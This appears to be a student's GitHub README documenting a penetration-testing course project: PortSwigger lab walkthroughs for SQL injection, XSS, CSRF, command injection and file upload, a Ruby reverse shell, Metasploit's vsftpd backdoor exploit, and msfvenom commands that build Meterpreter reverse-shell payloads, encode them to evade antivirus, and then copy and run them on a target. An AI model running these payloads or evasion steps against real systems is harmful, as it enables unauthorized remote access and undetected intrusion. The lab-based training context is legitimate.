# Mastering Burp Suite and Metasploit (project-3)
Presentation and demonstration of the tasks defined before the project
10 + labs from PortSwigger academy using Burp Suite
Tests on a real website (only in legal and controller way) using Burp Suite
Identifying which tool is needed for a task, and writing it as part of documentation, for example - task 1 required me to intercept a request, and send it to repeater because
Basics of Ruby
Using metasploit modules to break into metasploitable, tryhackme machines, vulnhub machines
Using msvenom to generate payloads and obfuscate them
Using searchsploit instead of exploitdb to look for  CVEs

## Post Swigger Labs
### Lab 1)  https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2012-27-04.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2012-26-33.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2012-25-56.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2012-25-24.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2012-30-44.png)
### Lab 2) https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2013-57-03.png)

Use the following payload to display the database version:
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2013-55-45.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2013-55-28.png)

### Lab 3) https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
**SQL injection attack, querying the database type and version on Oracle**

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2014-01-21.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2014-02-38.png)
### Lab 4) https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function.

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2014-20-53.png)

### Lab 5) https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked
To solve the lab, perform a cross-site scripting attack that bypasses the firewall (WAF) and calls the print() function.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2014-54-58.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2014-58-11.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-15%2015-12-50.png)

### Lab 7)   https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2013-37-09.png)

when changed request method)

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2013-37-21.png)

### Lab 8) https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present

This lab's email change functionality is vulnerable to CSRF.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2013-59-44.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2014-04-39.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2014-09-03.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2014-08-31.png)

### Lab 9)   https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
This lab's email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren't integrated into the site's session handling system.
The title of the lab tells us that we can use Wieners csrf to achieve our goal on Carlos page. So at first we should log in to Wieners page and try to change the email to get needed request.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-22%2011-21-07.png)
Here is the request. But we need unused csrf token, so we need to copy that value and drop the request.
Then we should use payload and send the exploit to the victim.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-22%2011-13-28.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-22%2011-19-17.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-22%2011-19-46.png)



### Lab 10) https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

To solve the lab, exploit the blind OS command injection vulnerability to cause a 10 second delay.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2000-41-04.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2000-25-56.png)

### Lab 11) https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection

The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2001-12-47.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2001-12-25.png)

### Lab 12)  https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2004-19-55.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2004-16-56.png)

### Lab 13)  https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass
This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2005-02-18.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2005-01-07.png)

### Lab 14)  https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2011-17-13.png)

### Lab 15) https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic

This lab is vulnerable to server-side template injection due to the unsafe construction of an ERB template.

To solve the lab, review the ERB documentation to find out how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-21%2011-55-18.png)

## Write a reverse shell in Ruby

https://github.com/Sonakhach/project-3/blob/main/revers_shell.rb

**What is reverse shell?**

A reverse shell attack is a type of cyberattack where a threat actor establishes a connection from a target machine (the victim's) to their machine. Reverse shell attacks are often executed via TCP and, in rare cases, ICMP or UDP. The goal of a reverse shell attack is to provide the attacker with unauthorized remote access to redirect outgoing connections from the network of the remote host (the victim). 

**On the attacker's machine, use a tool like Netcat to listen for incoming connections**
```
nc -lvp 4444
```
**Execute the Ruby script on the target machine**

```
ruby reverse_shell.rb
```

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-28%2012-55-29.png)

## Write script in ruby which uses Classes (basics of OOP, explain)

https://github.com/Sonakhach/project-3/blob/main/reverse_shell_oop.rb

**Explanation of OOP Concepts:**

Class: The ReverseShell class encapsulates the properties (@ip, @port) and behaviors (connect method) of the reverse shell.

Object: An instance of the ReverseShell class is created (shell = ReverseShell.new(ip, port)).

Encapsulation: The logic and data of the reverse shell are bundled into the ReverseShell class.

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-28%2018-05-01.png)

## Using **searchsploit** instead of exploitdb to look for  **CVEs** in **metasploitable** machine. Find location of **metaspoit** scripts in your linux machine, open the code and read it. 

**1.What is the Common Vulnerabilities and Exposures (CVE) Glossary**

CVE stands for Common Vulnerabilities and Exposures. CVE is a glossary that classifies vulnerabilities. The glossary analyzes vulnerabilities and then uses the Common Vulnerability Scoring System (CVSS) to evaluate the threat level of a vulnerability. A CVE score is often used for prioritizing the security of vulnerabilities.

**2. The Metasploitable virtual machine is an intentionally vulnerable version of Ubuntu Linux designed for testing security tools and demonstrating common ..**

**3. Introduction to SearchSploit**

Included in the Exploit Database repository on GitHub is “searchsploit”, a command line search tool for Exploit-DB that also allows you to take a copy of Exploit Database with you, everywhere you go. SearchSploit gives you the power to perform detailed offline searches through your locally checked-out copy of the repository. This capability is particularly useful for security assessments on segregated or air-gapped networks without Internet access.

Since we are using GNOME build of Kali Linux, therefore, the “exploitdb” package is already included by default, all we need to do, open the terminal and just type “searchsploit” and press Enter. You will welcome by its help screen.

At first need to download if you don’t have it

```
sudo apt install exploitdb

```
Then update the database

```
searchsploit -u

```

**4. Metasploit Framework**

The Metasploit Framework is a Ruby-based, modular penetration testing platform that enables you to write, test, and execute exploit code. The Metasploit Framework contains a suite of tools that you can use to test security vulnerabilities, enumerate networks, execute attacks, and evade detection. At its core, the Metasploit Framework is a collection of commonly used tools that provide a complete environment for penetration testing and exploit development.



**Using searchsploit instead of exploitdb to look for  CVEs in metasploitable machine**

**Example of using searchsploit**

**Scanning services and version of metasploiable**

**We will use version of ftp server for searching vulnerabilities.**

**using –m options enable “copy to directory/folder parameter” as this option provides the same information as above related to the exploit, as well as copy the exploit in your current working directory.**

To read about exploit we can use the following command


![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-26_13_10_39.png)

## Using metasploit modules to break into (Exploit) metasploitable 

 1. Exploit vsftpd 2.3.4 Backdoor:
    
```
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST <target_ip>
set RPORT 21
exploit
```

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-28_01_54_55.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-28_01_54_32.png)
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-28_02_01_10.png)

##  After, try to write your own module, it doesn't have to do anything special, it just needs to load in msfconsole

https://github.com/Sonakhach/project-3/blob/main/my_test_module_for_metasploitable_mashin.rb

![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot%20from%202024-12-28%2021-36-02.png)

**Create the Module File: Create a Ruby file in the directory**

```
nano ~/.msf4/modules/exploits/custom/my_test_module.rb
```
If you want your module to do something meaningful, add a simple port-scanning logic to check if the target port is open:

**Open msfconsole, reload the modules to include the custom one, load your custom module**
```
reload_all
use exploits/custom/my_test_module
set RHOST <target_ip>
set RPORT 1234
run
```
![im1](https://github.com/Sonakhach/project-3/blob/main/Screenshot_2024-12-28_11_47_15.png)

## Using msvenom to generate payloads and obfuscate them
msfvenom is a powerful tool included with Metasploit that can generate payloads, encode them to bypass basic detection mechanisms, and even format them for specific platforms. Here's a guide on generating and obfuscating payloads using msfvenom.

**1. Generating a Payload**
   
Here’s how to create a simple reverse shell payload:/Linux Reverse Shell (ELF)/

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f elf > payload.elf

```
```-p linux/x86/meterpreter/reverse_tcp```: Specifies the payload type (Meterpreter reverse TCP shell for Linux).

```LHOST```: Your machine's IP address to receive the connection.

```LPORT```: The port to listen on.

```-f elf```: The format of the payload (ELF is the standard executable format for Linux).

```> payload.elf```: Saves the payload as an ELF file.

**2. Obfuscating Payloads**

To evade basic detection mechanisms, you can use encoders or modify the payload to make it less detectable.
Obfuscation makes the payload harder to detect by antivirus or intrusion detection systems.


You can use encoding to obfuscate the payload: **Linux Reverse Shell (ELF) with Obfuscation**

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port> -e x86/shikata_ga_nai -i 5 -f elf > payload_encoded.elf

```

```-e x86/shikata_ga_nai```: Specifies the encoder (shikata_ga_nai is a polymorphic XOR additive feedback encoder).

```-i 5```: Number of encoding iterations.

**3. Testing the Payload**

Start a Metasploit handler to catch the reverse shell:
```
msfconsole
use exploit/multi/handler
set payload linux/x86/meterpreter/reverse_tcp
set LHOST <attacker_ip>
set LPORT <port>
exploit
```
Transfer the payload to the target Linux machine:
```
scp payload.elf user@<target_ip>:/tmp
```
Make the payload executable on the target:
```
chmod +x /tmp/payload.elf
```
Execute the payload:
```
./payload.elf
```
